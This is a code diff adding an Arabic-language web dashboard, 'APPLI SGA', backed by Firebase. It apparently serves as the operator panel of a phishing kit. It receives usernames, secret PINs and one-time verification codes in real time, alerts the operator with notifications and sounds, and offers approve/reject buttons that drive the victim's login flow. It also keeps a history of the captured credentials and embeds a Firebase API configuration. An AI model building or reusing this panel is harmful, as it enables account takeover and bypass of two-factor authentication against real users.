@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة التحكم — APPLI SGA</title>
+<style>
+:root{
+  --bg-url: url("https://i.imgur.com/BUXMnBT.jpeg");
+  --bg-color:#eceef1;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;min-height:100%;background-color:var(--bg-color);background-image:var(--bg-url);background-position:center top;background-size:cover;background-repeat:no-repeat;background-attachment:fixed;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;direction:rtl}
+body{padding:20px;display:flex;justify-content:center}
+.container{width:100%;max-width:720px}
+.header{background:rgba(255,255,255,.96);border-radius:20px;padding:22px;margin-bottom:20px;box-shadow:0 8px 24px rgba(0,0,0,.12);text-align:center}
+.header h1{font-size:22px;color:#2b2b2b;margin-bottom:6px}
+.header p{font-size:13px;color:#828287}
+.header .count{display:inline-block;background:#D5262E;color:#fff;padding:5px 14px;border-radius:20px;font-size:13px;margin-top:12px;font-weight:600}
+.card{background:rgba(255,255,255,.98);border-radius:18px;padding:18px;margin-bottom:16px;box-shadow:0 6px 20px rgba(0,0,0,.1);border-right:5px solid #4BA93D}
+.card.code{border-right-color:#D5262E}
+.card.done{border-right-color:#9aa0a6;background:rgba(255,255,255,.94)}
+.card-title{font-size:15px;font-weight:700;color:#2b2b2b;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.badge{background:#ffeb3b;color:#2b2b2b;padding:2px 8px;border-radius:6px;font-size:11px;font-weight:600}
+.badge.ok{background:#4BA93D;color:#fff}
+.badge.no{background:#D5262E;color:#fff}
+.spacer{flex:1}
+.time{font-size:11px;color:#9a9a9f;font-weight:600;font-family:system-ui}
+.row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px dashed #e0e0e0;font-size:14px}
+.row:last-of-type{border-bottom:none}
+.row .label{color:#828287}
+.row .value{color:#1c1c1c;font-weight:700;font-family:ui-monospace,monospace;font-size:16px;letter-spacing:1px}
+.actions{display:flex;gap:10px;margin-top:14px}
+.btn{border:none;padding:13px;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;flex:1;transition:opacity .15s}
+.btn:active{opacity:.8}
+.btn-approve{background:linear-gradient(100deg,#4BA93D,#3d8d31);color:#fff}
+.btn-reject{background:linear-gradient(100deg,#D5262E,#b91f26);color:#fff}
+.empty{background:rgba(255,255,255,.9);border-radius:18px;padding:50px 20px;text-align:center;color:#828287;font-size:15px}
+.notify-btn{position:fixed;top:20px;left:20px;background:#4BA93D;color:#fff;border:none;padding:11px 18px;border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;display:none;z-index:100;box-shadow:0 4px 12px rgba(0,0,0,.2)}
+.notify-btn.show{display:block}
+
+/* ===== قسم السجل ===== */
+.section-title{background:rgba(255,255,255,.96);border-radius:14px;padding:13px 16px;margin:22px 0 14px;font-size:14px;font-weight:700;color:#2b2b2b;box-shadow:0 4px 14px rgba(0,0,0,.08);display:flex;justify-content:space-between;align-items:center}
+.section-title .n{background:#eceef1;color:#555;padding:3px 12px;border-radius:20px;font-size:12px;font-weight:700}
+</style>
+</head>
+<body>
+<button class="notify-btn" id="notifyBtn">🔔 تفعيل الإشعارات</button>
+<div class="container">
+  <div class="header">
+    <h1>لوحة التحكم</h1>
+    <p>مراجعة طلبات تسجيل الدخول ورموز التحقق</p>
+    <div class="count" id="count">0 طلب</div>
+  </div>
+
+  <div id="list"></div>
+
+  <div class="section-title" id="histTitle">
+    <span>Ronny Pavy</span>
+    <span class="n" id="histCount">0</span>
+  </div>
+  <div id="history"></div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+var firebaseConfig = {
+  apiKey: "AIzaSyBU6YD8G4OMhoj5ov_G9cnZGQyqPh6F698",
+  authDomain: "my-appone-c666e.firebaseapp.com",
+  databaseURL: "https://my-appone-c666e-default-rtdb.firebaseio.com",
+  projectId: "my-appone-c666e",
+  storageBucket: "my-appone-c666e.firebasestorage.app",
+  messagingSenderId: "898831815227",
+  appId: "1:898831815227:web:a28ab685c70e5b5d1cc21e",
+  measurementId: "G-XC5VZ93JLW"
+};
+firebase.initializeApp(firebaseConfig);
+var db = firebase.database();
+
+var list = document.getElementById('list');
+var count = document.getElementById('count');
+var historyEl = document.getElementById('history');
+var histCount = document.getElementById('histCount');
+var notifyBtn = document.getElementById('notifyBtn');
+
+/* ---------- الإشعارات ---------- */
+if ('Notification' in window && Notification.permission === 'default'){
+  notifyBtn.classList.add('show');
+  notifyBtn.onclick = function(){
+    Notification.requestPermission().then(function(p){
+      if (p === 'granted'){ notifyBtn.classList.remove('show'); beep(); }
+    });
+  };
+}
+function beep(){
+  try{
+    var ctx = new (window.AudioContext || window.webkitAudioContext)();
+    var o = ctx.createOscillator(), g = ctx.createGain();
+    o.connect(g); g.connect(ctx.destination);
+    o.frequency.value = 880; g.gain.value = 0.12;
+    o.start(); o.stop(ctx.currentTime + 0.15);
+  }catch(e){}
+}
+function notify(title, body){
+  if ('Notification' in window && Notification.permission === 'granted'){
+    try{ new Notification(title, { body: body }); }catch(e){}
+  }
+  beep();
+  document.title = ' ' + title;
+  setTimeout(function(){ document.title = 'لوحة التحكم — APPLI SGA'; }, 5000);
+}
+
+/* ---------- استقبال الطلبات الجديدة ---------- */
+db.ref('requests').on('child_added', function(snap){
+  var v = snap.val(); if (!v) return;
+  if (v.status === 'pending' && v.createdAt && Date.now() - v.createdAt < 10000){
+    notify('طلب تسجيل دخول جديد', 'المستخدم: ' + v.username);
+  }
+  if (v.status === 'code_pending' && v.codeSubmittedAt && Date.now() - v.codeSubmittedAt < 10000){
+    notify('رمز تحقق جديد', 'المستخدم: ' + v.username + ' — الرمز: ' + v.userCode);
+  }
+});
+db.ref('requests').on('child_changed', function(snap){
+  var v = snap.val(); if (!v) return;
+  if (v.status === 'pending'){
+    notify('طلب تسجيل دخول جديد', 'المستخدم: ' + v.username);
+  }
+  if (v.status === 'code_pending'){
+    notify('رمز تحقق جديد', 'المستخدم: ' + v.username + ' — الرمز: ' + v.userCode);
+  }
+});
+
+/* ---------- الرسم ---------- */
+db.ref('requests').on('value', function(snap){
+  var data = snap.val() || {};
+  var active = [], done = [];
+
+  Object.keys(data).forEach(function(k){
+    var v = data[k]; if (!v) return;
+    if (v.status === 'pending' || v.status === 'code_pending'){
+      active.push({ id: k, data: v });
+    } else if (v.status === 'approved' || v.status === 'rejected' ||
+               v.status === 'verified' || v.status === 'code_rejected'){
+      done.push({ id: k, data: v });
+    }
+  });
+
+  /* ----- الطلبات الحالية ----- */
+  active.sort(function(a,b){ return (a.data.createdAt||0) - (b.data.createdAt||0); });
+  count.textContent = active.length + ' طلب';
+
+  if (active.length === 0){
+    list.innerHTML = '<div class="empty">لا توجد طلبات حالياً</div>';
+  } else {
+    var html = '';
+    active.forEach(function(it){
+      var v = it.data;
+      if (v.status === 'pending'){
+        html += '<div class="card">';
+        html += '<div class="card-title"> طلب تسجيل دخول <span class="badge">جديد</span></div>';
+        html += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
+        html += '<div class="row"><span class="label">الرمز السري</span><span class="value">'+esc(v.pin)+'</span></div>';
+        html += '<div class="actions">';
+        html += '<button class="btn btn-approve" onclick="approve(\''+it.id+'\')">✓ موافقة</button>';
+        html += '<button class="btn btn-reject" onclick="reject(\''+it.id+'\')">✕ رفض</button>';
+        html += '</div></div>';
+      } else if (v.status === 'code_pending'){
+        html += '<div class="card code">';
+        html += '<div class="card-title"> رمز تحقق <span class="badge">بانتظار المراجعة</span></div>';
+        html += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
+        html += '<div class="row"><span class="label">رمز التحقق</span><span class="value">'+esc(v.userCode)+'</span></div>';
+        html += '<div class="actions">';
+        html += '<button class="btn btn-approve" onclick="approveCode(\''+it.id+'\')">✓ موافقة</button>';
+        html += '<button class="btn btn-reject" onclick="rejectCode(\''+it.id+'\')">✕ رفض</button>';
+        html += '</div></div>';
+      }
+    });
+    list.innerHTML = html;
+  }
+
+  /* ----- السجل (مقبولة / مرفوضة) ----- */
+  done.sort(function(a,b){
+    return decidedTime(b.data) - decidedTime(a.data);
+  });
+  histCount.textContent = done.length;
+
+  if (done.length === 0){
+    historyEl.innerHTML = '<div class="empty">لا يوجد سجل بعد — ستظهر هنا الطلبات بعد القبول أو الرفض</div>';
+    return;
+  }
+
+  var h = '';
+  done.forEach(function(it){
+    var v = it.data;
+    var isLogin = (v.status === 'approved' || v.status === 'rejected');
+    var ok = (v.status === 'approved' || v.status === 'verified');
+    h += '<div class="card done">';
+    h += '<div class="card-title">' + (isLogin ? ' تسجيل دخول' : ' رمز تحقق');
+    h += '<span class="badge ' + (ok ? 'ok' : 'no') + '">' + (ok ? 'مقبول' : 'مرفوض') + '</span>';
+    h += '<span class="spacer"></span><span class="time">' + fmt(decidedTime(v)) + '</span></div>';
+    h += '<div class="row"><span class="label">اسم المستخدم</span><span class="value">'+esc(v.username)+'</span></div>';
+    if (isLogin){
+      h += '<div class="row"><span class="label">الرمز السري</span><span class="value">'+esc(v.pin)+'</span></div>';
+    } else {
+      h += '<div class="row"><span class="label">رمز التحقق</span><span class="value">'+esc(v.userCode)+'</span></div>';
+    }
+    h += '</div>';
+  });
+  historyEl.innerHTML = h;
+});
+
+function decidedTime(v){
+  return v.decidedAt || v.verifiedAt || v.codeRejectedAt || v.createdAt || 0;
+}
+function fmt(ts){
+  if (!ts) return '—';
+  try{
+    return new Date(ts).toLocaleString('ar-EG', {
+      year:'numeric', month:'2-digit', day:'2-digit',
+      hour:'2-digit', minute:'2-digit'
+    });
+  }catch(e){ return new Date(ts).toLocaleString(); }
+}
+function esc(s){
+  return String(s==null?'':s).replace(/[&<>"']/g, function(c){
+    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
+  });
+}
+
+/* ---------- عمليات القبول والرفض (منطقها كما هو + طابع زمني للقرار) ---------- */
+function approve(id){ db.ref('requests/'+id).update({ status:'approved', decidedAt: Date.now() }); }
+function reject(id){ db.ref('requests/'+id).update({ status:'rejected', decidedAt: Date.now() }); }
+function approveCode(id){ db.ref('requests/'+id).update({ status:'verified', verifiedAt: Date.now(), decidedAt: Date.now() }); }
+function rejectCode(id){ db.ref('requests/'+id).update({ status:'code_rejected', codeRejectedAt: Date.now(), decidedAt: Date.now() }); }
+</script>
+</body>
+</html>
